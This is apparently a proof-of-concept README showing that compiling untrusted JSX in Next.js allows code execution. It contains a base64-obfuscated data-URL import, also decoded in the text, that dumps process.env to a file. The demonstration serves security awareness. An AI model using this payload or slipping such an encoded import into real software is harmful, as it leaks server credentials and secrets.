# PoC: Next.js x Untrusted User Template Compilation

You should not compile Untrusted User Template(JSX/React Component), because it will cause Remote Code Execution.

> Search Word: Server Side Template Injection

## Code

```js
export default function Home() {
    import('data:text/javascript;charset=utf-8;base64,cHJvY2Vzcy5yZXBvcnQud3JpdGVSZXBvcnQoInRlc3QiLCBuZXcgRXJyb3IoSlNPTi5zdHJpbmdpZnkocHJvY2Vzcy5lbnYpKSk7IGV4cG9ydCBkZWZhdWx0IDE7').then(r => {
        console.log(r)
    });
    return <></>
}
```

Raw:

```js
process.report.writeReport("test", new Error(JSON.stringify(process.env))); export default 1;
```

1. Stringify `process.env`
2. Write the env to `test` file

It will leak your server environment as a file. 

References:

- [Evaluating JavaScript code via `import()`](https://2ality.com/2019/10/eval-via-import.html)
- [process.report.writeReport([filename][, err])](https://nodejs.org/api/process.html#processreportwritereportfilename-err)

## Dev

    yarn install
    yarn static-build


## Related

- [[クライアントサイド〜サーバーサイド] テンプレートエンジンでのセキュリティ的な問題や考え方 | Web Scratch](https://efcl.info/2019/12/27/template-engine-security/)
